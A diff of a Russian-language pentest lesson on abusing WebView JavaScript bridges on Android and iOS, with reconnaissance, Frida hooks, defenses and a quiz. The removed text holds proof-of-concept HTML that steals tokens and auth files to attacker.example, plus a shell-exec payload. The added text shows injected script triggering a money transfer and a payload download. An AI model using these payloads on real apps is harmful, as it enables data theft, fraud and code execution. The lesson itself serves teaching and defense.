@@ -14,363 +14,184 @@ useful_for:
 estimated_minutes: 50
 summary: "Злоупотребление JavaScript-мостами WebView: как @JavascriptInterface превращает XSS в нативные вызовы, поиск опасных методов, эксплуатация и защита."
 ---
-## Введение
 
-WebView встраивает веб-контент в приложение и часто соединяет JS с нативным кодом через **JavaScript bridge** (`addJavascriptInterface` в Android, `WKScriptMessageHandler` в iOS). Если WebView загружает недоверенный контент (внешний URL, deep link-параметр), а мост экспонирует опасные методы (файлы, команды, токены), то XSS на странице превращается в нативный вызов — вплоть до RCE. Это одна из самых критичных мобильных цепочек. Продолжает `mobile-webview-deep`.
+## Вопрос, с которого всё начинается
 
-Ментальная модель: мост — это «дверь» из ненадёжного веб-мира в доверенный нативный. Задача — найти открытую дверь и то, что за ней.
+В прошлом уроке мы выяснили, что `addJavascriptInterface` создаёт мост между веб-страницей и Java-кодом. Но сам мост — не уязвимость: он нужен приложению, чтобы веб-часть могла звать нативную. Проблема в том, **какой контент** попадает на страницу с мостом. Как именно злоупотребляют JS-мостами и как атакующий достигает недоверенного контента?
 
-## Как устроен мост (Android)
+## Наш пример: приложение с мостом
 
-```java
-webView.getSettings().setJavaScriptEnabled(true);
-webView.addJavascriptInterface(new Bridge(), "native");
-
-class Bridge {
-  @JavascriptInterface
-  public String readFile(String path) { return new String(Files.readAllBytes(Paths.get(path))); }
-  @JavascriptInterface
-  public void exec(String cmd) { Runtime.getRuntime().exec(cmd); }
-}
-```
-
-Из JS: `native.readFile("/data/data/com.target.app/...")` или `native.exec("...")`. `@JavascriptInterface` обязателен (иначе метод недоступен с Android 4.2) — но его наличие у опасного метода и есть уязвимость.
-
-## Поиск мостов
-
-```bash
-# статически
-jadx -d out app.apk
-grep -rn "addJavascriptInterface\|@JavascriptInterface\|JavascriptInterface" out/sources/ | head
-# настройки WebView
-grep -rn "setJavaScriptEnabled\|setAllowFileAccess\|setAllowUniversalAccessFromFileURLs" out/sources/ | head
-# динамически: логировать экспонируемые мосты
-```
-
-Frida-хук:
-
-```javascript
-Java.perform(function() {
-  var WV = Java.use("android.webkit.WebView");
-  WV.addJavascriptInterface.implementation = function(obj, name) {
-    console.log("[bridge] " + name + " -> " + obj.getClass().getName());
-    return this.addJavascriptInterface(obj, name);
-  };
-});
-```
-
-## Полный сквозной пример: XSS → bridge → кража токена
-
-Дано: WebView грузит URL из deep link, мост `native` с методом `getToken()`.
-
-```bash
-# 1. Запускаем приложение с внешним URL
-adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.example/evil.html"
-```
-
-`evil.html`:
-
-```html
-<script>
-  // вызываем нативный метод через мост
-  var t = native.getToken();
-  new Image().src = "https://attacker.example/leak?t=" + encodeURIComponent(t);
-</script>
-```
-
-Если токен утёк — bridge abuse подтверждён. Для RCE (если есть `exec`):
-
-```html
-<script>native.exec("sh -c 'id > /sdcard/pwned'")</script>
-```
-
-## iOS: WKWebView-мосты
-
-```objectivec
-WKUserContentController *ucc = [[WKUserContentController alloc] init];
-[ucc addScriptMessageHandler:self name:@"native"];
-// JS: window.webkit.messageHandlers.native.postMessage({cmd:"..."})
-```
-
-Проверяйте `userContentController(_:didReceive:)` — какие команды обрабатываются. Если доверяют `message.body`, а WebView грузит внешний контент — та же цепочка.
-
-## Векторы достижения недоверенного контента
-
-- Deep link с параметром `url`/`target`.
-- `shouldOverrideUrlLoading` возвращает `false` для внешних URL.
-- Редирект с доверенного домена на attacker (open redirect).
-- Загрузка HTML из внешнего файла/QR.
-- `setAllowUniversalAccessFromFileURLs(true)` + `file://` XSS.
-
-## Защита (что искать в отчёте)
-
-- Не экспонировать опасные методы через `@JavascriptInterface`.
-- Валидировать URL (whitelist доменов) перед `loadUrl`.
-- `setAllowFileAccess(false)`, `setAllowUniversalAccessFromFileURLs(false)`.
-- Не возвращать `false` из `shouldOverrideUrlLoading` для внешних URL.
-- Использовать `WebViewAssetLoader` для локального контента.
-
-## Частые ошибки
-
-- **Не включить `setJavaScriptEnabled`**: тогда мост не работает, но и XSS не сработает — проверяйте оба.
-- **Искать только `addJavascriptInterface`**: iOS-мосты (`WKScriptMessageHandler`) тоже.
-- **Игнорировать настройки WebView**: `file://`-доступ усиливает XSS.
-- **Не найти источник недоверенного контента**: без него мост недостижим.
-- **Тест на пустом WebView**: нужен реальный вход (deep link/redirect).
-- **Забыть про обфускацию**: имена мостов могут быть переименованы — хукайте `addJavascriptInterface`.
-
-## Что дальше / решение
-
-Свяжите с `mobile-deeplink-rce` (вход), `mobile-webview-deep` (WebView-уязвимости), `mobile-deeplink-deep`. Демонстрируйте: вход → внешний контент → вызов моста → результат. Рекомендация: минимизировать мосты, валидировать URL, отключать файловый доступ.
-
-## Справочная таблица
-
-| Платформа | Мост | Хук |
-|-----------|------|-----|
-| Android | addJavascriptInterface | Frida WebView |
-| iOS | WKScriptMessageHandler | Frida WKWebView |
-| Оба | postMessage | логирование |
-
-| Настройка | Опасность |
-|-----------|-----------|
-| setAllowFileAccess(true) | доступ к файлам |
-| setAllowUniversalAccessFromFileURLs(true) | XSS из file:// |
-| shouldOverrideUrlLoading=false | внешний контент |
-
-## Полный разбор: от deep link до выполнения нативного метода
-
-Разберём сквозной сценарий целиком, с разведкой и PoC. Дано: приложение `com.target.app` с экспортированной activity `WebActivity`, deep link `target://web?u=`, и WebView с мостом.
-
-**Шаг 1. Разведка манифеста.**
-
-```bash
-apktool d app.apk -o s
-grep -n -A6 'WebActivity' s/AndroidManifest.xml
-# <activity android:name=".WebActivity" android:exported="true">
-#   <intent-filter>
-#     <action android:name="android.intent.action.VIEW"/>
-#     <category android:name="android.intent.category.BROWSABLE"/>
-#     <data android:scheme="target" android:host="web"/>
-#   </intent-filter>
-```
-
-**Шаг 2. Поиск моста в декомпилированном коде.**
-
-```bash
-jadx -d out app.apk
-grep -rn "addJavascriptInterface\|setJavaScriptEnabled\|loadUrl\|shouldOverrideUrlLoading" out/sources/com/target/app/ | head
-```
-
-Находим:
+Представим приложение-кошелёк с экраном «Пополнить». Он открывает локальную страницу и регистрирует мост:
 
 ```java
 webView.getSettings().setJavaScriptEnabled(true);
-webView.addJavascriptInterface(new JsApi(this), "app");
-// ...
-webView.loadUrl(getIntent().getData().getQueryParameter("u"));
+webView.addJavascriptInterface(new WalletBridge(), "Wallet");
+webView.loadUrl("file:///android_asset/pay.html");
 ```
 
-**Шаг 3. Анализ моста.** Смотрим `JsApi`:
-
 ```java
-class JsApi {
-  @JavascriptInterface public String getToken(){ return prefs.getString("token", ""); }
-  @JavascriptInterface public void openUrl(String url){ webView.loadUrl(url); }
-  @JavascriptInterface public String readFile(String p) throws IOException {
-    return new String(Files.readAllBytes(Paths.get(p)));
-  }
+class WalletBridge {
+    @JavascriptInterface
+    public String getBalance() { return api.balance(); }
+    @JavascriptInterface
+    public void pay(String to, String amount) { api.transfer(to, amount); }
 }
 ```
 
-Есть `readFile` → потенциальный RCE/утечка. `getToken` → кража токена.
+Мост даёт веб-странице два метода: посмотреть баланс и **перевести деньги**. Если злоумышленник добьётся выполнения своего JS на этой странице, он сможет вызвать `Wallet.pay(...)`. Разберём, как этого добиться.
 
-**Шаг 4. PoC.**
+## Шаг 1: как устроен мост
 
-```bash
-adb shell am start -a android.intent.action.VIEW -d "target://web?u=https://attacker.example/x.html"
+`addJavascriptInterface(obj, "Name")` публикует Java-объект в JS-контексте страницы под именем `Name`. Методы, помеченные `@JavascriptInterface`, становятся вызываемыми: `Name.method(args)`. Начиная с Android 4.2 доступны только помеченные методы — это ограничило классический RCE через рефлексию, но не убрало сам класс атак.
+
+Ключевой вопрос: **доверенный ли контент грузится на страницу с мостом?** Если страница локальная и статичная — риск ниже. Если в неё попадает внешний ввод — риск высокий.
+
+## Шаг 2: поиск мостов
+
+Ищем регистрации мостов в декомпилированном коде:
+
+```
+$ grep -rn "addJavascriptInterface" out/ | head
+out/sources/com/example/pay/PayActivity.java:  webView.addJavascriptInterface(new WalletBridge(), "Wallet");
 ```
 
-`x.html`:
+Рядом смотрим, что грузится: `loadUrl`, `loadDataWithBaseURL`, `evaluateJavascript`. Если в загружаемый контент попадает внешний параметр — мост достижим для атакующего.
 
-```html
-<script>
-  var t = app.getToken();
-  fetch("https://attacker.example/l?t="+encodeURIComponent(t));
-  var f = app.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
-  fetch("https://attacker.example/l?f="+encodeURIComponent(f));
-</script>
-```
+## Шаг 3: достижение недоверенного контента
 
-**Шаг 5. Подтверждение.** В mitmproxy видим запросы на attacker с токеном и содержимым prefs. Уязвимость подтверждена: XSS в WebView → нативный мост → утечка приватных данных.
+Способы получить свой JS на странице с мостом:
 
-## Проверка iOS-варианта (WKWebView)
+- **Deep link** передаёт параметр в `loadUrl`: `app://pay?amount=<script>...</script>`.
+- **Отражённый XSS** на локальной странице, которая подставляет параметр.
+- **Загрузка внешнего URL** из-за отсутствия белого списка.
+- **MITM** (если нет pinning) — подмена ответа сервера, отдающего HTML.
 
-```bash
-grep -rn "WKUserContentController\|addScriptMessageHandler\|evaluateJavaScript" out/ | head
-```
+Любой из этих путей ведёт к выполнению вашего JS в контексте моста.
 
-```swift
-// уязвимо, если message.body доверяют и WebView грузит внешний URL
-func userContentController(_ ucc: WKUserContentController, didReceive message: WKScriptMessage) {
-  if message.name == "native", let body = message.body as? [String: Any] {
-    let cmd = body["cmd"] as? String ?? ""
-    run(cmd)   // <- RCE
-  }
-}
-```
+## Шаг 4: полный сценарий атаки
 
-PoC на iOS: тот же внешний URL → `window.webkit.messageHandlers.native.postMessage({cmd:"..."})`.
+Соберём цепочку:
 
-## Валидация URL: типичные ошибки
+1. Атакующий формирует ссылку с полезной нагрузкой в параметре.
+2. Deep link открывает экран оплаты и подставляет параметр в страницу.
+3. Срабатывает XSS, и в контексте выполняется скрипт.
+4. Скрипт вызывает `Wallet.pay("attacker_account", "1000")`.
+5. Деньги уходят, пользователь ничего не нажимал.
 
-Проверки, которые легко обходятся:
+Каждое звено по отдельности — не «взлом»: deep link легитимен, мост легитимен, JS легитимен. Вместе они дают перевод средств.
 
-```java
-// ПЛОХО: startsWith проверяет только начало
-if (url.startsWith("https://target.com")) loadUrl(url);
-// обход: https://target.com.attacker.example/  или https://target.com@attacker/
-// ПЛОХО: contains
-if (url.contains("target.com")) loadUrl(url);
-// обход: https://attacker.com/?x=target.com
-// ПЛОХО: не проверять редирект
-// если target.com имеет open redirect -> уход на attacker
-```
+## Шаг 5: iOS — WKWebView-мосты
 
-Правильно — парсить URL и сверять `getHost()` по whitelist.
+На iOS аналог — `WKScriptMessageHandler` и `evaluateJavaScript`. JS вызывает `window.webkit.messageHandlers.bridge.postMessage(...)`. Те же принципы: недоверенный контент + привилегированный обработчик = уязвимость. Ищем `addScriptMessageHandler` и `userContentController`.
 
-## Методический чек-лист
+## Шаг 6: защита
 
-1. Перечислить все WebView-точки входа (deep link, exported activity, intent extra).
-2. Проверить настройки WebView (JS, file access, universal access).
-3. Найти все мосты (`addJavascriptInterface`, `WKScriptMessageHandler`).
-4. Классифицировать методы моста (файлы, сеть, токены, exec).
-5. Построить PoC от входа до вызова моста.
-6. Зафиксировать влияние и рекомендации.
+Правильные практики:
 
-## Рекомендации в отчёте
+- Грузить только **доверенный** контент на страницы с мостом.
+- Не подставлять внешние данные в HTML без экранирования.
+- Ограничивать методы моста: не давать `pay`/`read`/`exec`.
+- Проверять origin перед вызовом чувствительных операций.
+- Использовать `WebViewCompat.postWebMessage` (origin-проверка) вместо моста.
 
-- Никогда не грузить недоверенные URL в WebView с включённым JS-мостом.
-- Валидировать URL строго (whitelist хостов, запрет редиректов).
-- Отключать `setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs`.
-- Не экспонировать опасные методы (файлы, exec); минимизировать мост.
-- Использовать `WebViewAssetLoader` и доверенные домены.
-- Для iOS — валидировать `message.body` и `message.name`, не выполнять произвольные команды.
+## Разбор реального сценария
 
-## Обфускация мостов и динамический поиск
+Приложение-мессенджер открывает ссылки из чата во встроенном WebView с зарегистрированным мостом `Bridge.download(url)`. Ссылка из сообщения задаёт URL. Атакующий присылает пользователю ссылку на свою страницу, которая вызывает `Bridge.download("http://evil/payload")`. Приложение скачивает и открывает файл — выполнение кода. Мост был легитимным, ссылка легитимной; уязвимость в том, что мост доверял любому контенту, который мог открыть пользователь.
 
-Имена мостов и методов часто обфусцированы (R8/ProGuard), поэтому статический поиск по строке может не сработать. В этом случае ищите по классу: любой класс, содержащий методы с `@JavascriptInterface`, — мост. Grep по аннотации надёжнее, чем по имени:
+## Полный прогон от начала до конца
 
-```bash
-grep -rn "@JavascriptInterface" out/sources/ | head
-# затем смотрим класс и его методы
-```
+Соберём цепочку в один сценарий. Сначала `grep addJavascriptInterface` и выписываем методы моста. Затем ищем, что грузится на страницу с мостом: `loadUrl`, `loadData`. Определяем источники внешнего контента: deep link, ссылка из чата, внешний URL. Пробуем подсунуть свой JS через самый доступный источник. Вызываем метод моста и наблюдаем эффект. Итог — либо подтверждённое выполнение привилегированного метода, либо защищённый мост.
 
-Динамически мост находится хуком `WebView.addJavascriptInterface` — вы получаете и имя, и класс. Это надёжнее статики при обфускации.
+## Частые вопросы
 
-## Динамический поиск и подтверждение
+**«Мост сам по себе уязвимость?»** — нет, уязвимость в недоверенном контенте на странице с мостом. **«Что делать, если контент только локальный?»** — риск ниже, но проверяйте, не подставляется ли в него внешний ввод. **«Нужен ли root?»** — нет. **«iOS аналогичен?»** — да, через `WKScriptMessageHandler`. **«Как защитить?»** — доверенный контент, экранирование, ограничение методов, проверка origin.
 
-Запустите приложение под Frida со скриптом, логирующим все мосты и все `loadUrl`:
+## Практический совет
 
-```javascript
-Java.perform(function() {
-  var WV = Java.use("android.webkit.WebView");
-  WV.addJavascriptInterface.implementation = function(o,n){ console.log("[bridge] "+n+" -> "+o.getClass().getName()); return this.addJavascriptInterface(o,n); };
-  WV.loadUrl.overload("java.lang.String").implementation = function(u){ console.log("[loadUrl] "+u); return this.loadUrl(u); };
-  WV.loadUrl.overload("java.lang.String","java.util.Map").implementation = function(u,h){ console.log("[loadUrl+] "+u); return this.loadUrl(u,h); };
-});
-```
+Ищите не мост, а **путь к мосту**. Мостов в приложении может быть много, но опасен тот, до которого доходит чужой контент. Поэтому после `addJavascriptInterface` сразу задайте вопрос: «как сюда попадёт мой JS?». Если ответ «никак» — фиксируйте как низкий риск; если «через deep link/ссылку/внешний URL» — это рабочая цепочка, и её надо довести до эффекта.
 
-Так вы видите реальные вызовы: какой URL грузится и какие мосты экспонированы. Если `loadUrl` получает внешний URL, а мост даёт доступ к файлам/токенам — цепочка подтверждена.
+## Ещё один нюанс: обфускация мостов
 
-## Защита от обфускации
+Разработчики иногда обфусцируют имена мостов, чтобы усложнить анализ: `addJavascriptInterface(obj, "a")`. Но имя моста видно в JS-коде страницы — ищите в загружаемом HTML вызовы вида `a.method()`. Кроме того, имя может динамически подставляться. Если статический grep не находит мост, поищите `addJavascriptInterface` по байткоду и посмотрите, какое имя передаётся, — а затем найдите это имя в ассетах страницы.
 
-Обфускация не защищает от хука `addJavascriptInterface`: вы перехватываете сам механизм, а не имя. Поэтому рекомендация — не полагаться на переименование, а минимизировать мосты и валидировать URL. Обфускация лишь замедляет статический анализ.
+## Связь с другими уроками
+
+Мост — это лишь один из sink в цепочке. Чтобы до него добраться, часто нужен deep link (вход), WebView (транспорт) и отсутствие проверки контента (условие). Поэтому тему мостов разбирают после deep links и WebView: без понимания входа и транспорта непонятно, как достичь моста. Дальше мы соберём эти части в единую цепочку deep link → RCE.
 
 ## Итог
 
-JS-bridge abuse — один из самых критичных классов мобильных уязвимостей: XSS превращается в нативный вызов. Динамический поиск через хук механизма обходит обфускацию и даёт точную картину.
+Мост — это привилегированный API, доступный из веба. Его безопасность целиком зависит от того, какой контент до него доходит. Проверяя приложение, всегда идите от моста назад: найдите, что грузится на страницу, и определите, может ли атакующий это контролировать. Если может — у вас на руках цепочка, а не «просто мост». Помните: мост без недоверенного контента безобиден, а недоверенный контент без моста — обычный веб-XSS. Опасна именно их связка, и именно её ищет пентестер.
 
-## Практикум: полный PoC JS-bridge
+## Что мы теперь знаем
 
-Разберём полный PoC от разведки до утечки.
+По-простому:
 
-Шаг 1. Находим мост динамически:
+1. Мост — это Java-объект, доступный из JS под именем.
+2. Опасен не мост, а недоверенный контент на странице с мостом.
+3. Достичь его можно через deep link, XSS, внешний URL или MITM.
+4. Цепочка deep link → XSS → мост даёт перевод денег.
+5. Защита: доверенный контент, экранирование, ограничение методов.
 
-```javascript
-Java.perform(function() {
-  var WV = Java.use("android.webkit.WebView");
-  WV.addJavascriptInterface.implementation = function(o,n){ console.log("[bridge] "+n+" -> "+o.getClass().getName()); return this.addJavascriptInterface(o,n); };
-});
-```
+## На что смотреть дальше
 
-Шаг 2. Определяем методы моста. Декомпилируем класс моста (`jadx`) и смотрим методы с `@JavascriptInterface`. Классифицируем: чтение файлов, токены, exec, сеть.
+- **Ищите `addJavascriptInterface`** и читайте методы моста.
+- **Смотрите, что грузится** на страницу с мостом.
+- **Ищите пути достижения** вашего JS: deep link, XSS, внешний URL.
+- **Проверяйте origin** перед чувствительными вызовами.
 
-Шаг 3. Находим вход для недоверенного контента. Deep link с параметром URL, открытый редирект, внешний файл. Проверяем, что WebView грузит внешний контент (`shouldOverrideUrlLoading` возвращает false).
+## Валидация вызовов моста
 
-Шаг 4. Собираем HTML:
-
-```html
-<script>
-  var t = app.getToken();
-  new Image().src = "https://attacker.example/l?t=" + encodeURIComponent(t);
-  var f = app.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
-  fetch("https://attacker.example/l?f=" + encodeURIComponent(f));
-</script>
-```
-
-Шаг 5. Запускаем вход с этим URL, наблюдаем утечку в mitmproxy. Подтверждаем.
-
-## Без доступа к мосту
-
-Если WebView не грузит внешний контент, ищите другие входы: загрузка HTML из файла, редирект с доверенного домена, обновляемый контент. Иногда достаточно XSS на доверенном домене.
-
-## Что писать в отчёте
-
-Полный путь: вход → внешний контент → вызов моста → результат. Рекомендация: валидировать URL, отключать файловый доступ, минимизировать мост.
+Правильно спроектированный мост сам проверяет, откуда пришёл вызов. Часто разработчики полагаются только на то, что «страница своя», и не валидируют аргументы. Проверьте, экранируются ли данные, передаваемые из JS в нативные методы, и можно ли через них добраться до файловой системы или сети. Мост, который слепо доверяет аргументам, опасен даже без XSS — если до него дойдёт чужой контент.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Что превращает XSS в WebView в нативный вызов?"
+- question: "Что такое JS-мост в WebView?"
   options:
-    - "JavaScript bridge (addJavascriptInterface/@JavascriptInterface)"
-    - "Manifest"
-    - "CA-сертификат"
-    - "Wi-Fi"
+    - "Java-объект, доступный из JS под именем"
+    - "Сетевой протокол"
+    - "База данных"
+    - "Сертификат"
   answer: 0
-- question: "Какая аннотация обязательна для метода, экспонируемого в JS (Android)?"
+- question: "Что делает мост уязвимым?"
   options:
-    - "@JavascriptInterface"
-    - "@Override"
-    - "@Nullable"
-    - "@Deprecated"
+    - "На страницу с мостом попадает недоверенный контент"
+    - "Мост зашифрован"
+    - "Мост использует HTTPS"
+    - "Мост помечен @JavascriptInterface"
   answer: 0
-- question: "Какая настройка WebView открывает доступ к локальным файлам?"
+- question: "Как атакующий может достичь своего JS на странице с мостом?"
   options:
-    - "setAllowFileAccess(true)"
-    - "setJavaScriptEnabled(false)"
-    - "setSupportZoom(false)"
-    - "setBlockNetworkLoads(true)"
+    - "Через deep link, XSS, внешний URL или MITM"
+    - "Только через root"
+    - "Только через Bluetooth"
+    - "Никак"
   answer: 0
-- question: "Какой iOS-мост используется в WKWebView?"
+- question: "Что ограничивает классический RCE через мост на Android 4.2+?"
   options:
-    - "WKScriptMessageHandler"
-    - "addJavascriptInterface"
-    - "DataClient"
-    - "CarPropertyManager"
+    - "Доступны только методы, помеченные @JavascriptInterface"
+    - "Мост отключается"
+    - "JavaScript выключен"
+    - "Требуется сертификат"
   answer: 0
-- question: "Что искать как источник недоверенного контента?"
+- question: "Что используют вместо моста для проверки origin?"
   options:
-    - "Deep link-параметр URL, open redirect, внешний файл"
-    - "Пароль Wi-Fi"
-    - "Версию Android"
-    - "Размер APK"
+    - "WebViewCompat.postWebMessage"
+    - "loadUrl"
+    - "setJavaScriptEnabled"
+    - "setWebViewClient"
   answer: 0
 ```
 
+## Куда дальше
+
+Мы разобрали злоупотребление JS-мостами. В следующем уроке соберём всё воедино: **deep link → RCE**, полную цепочку от ссылки до выполнения кода. А пока запомни главное: мост безопасен только тогда, когда на страницу с ним никогда не попадает чужой контент.
+
 ## Где пригодится
 
-- **Пентест:** критичные цепочки RCE.
-- **Bug bounty:** XSS→bridge как critical.
-- **Анализ малвари:** понимание атак.
-- **CTF:** Mobile-задачи на WebView.
+- **CTF Mobile:** цепочка до вызова привилегированного метода.
+- **Bug bounty:** мост + XSS — серьёзная находка.
+- **Пентест:** глубокий аудит WebView и мостов.
+- **Работа:** ревью архитектуры веб-нативного взаимодействия.
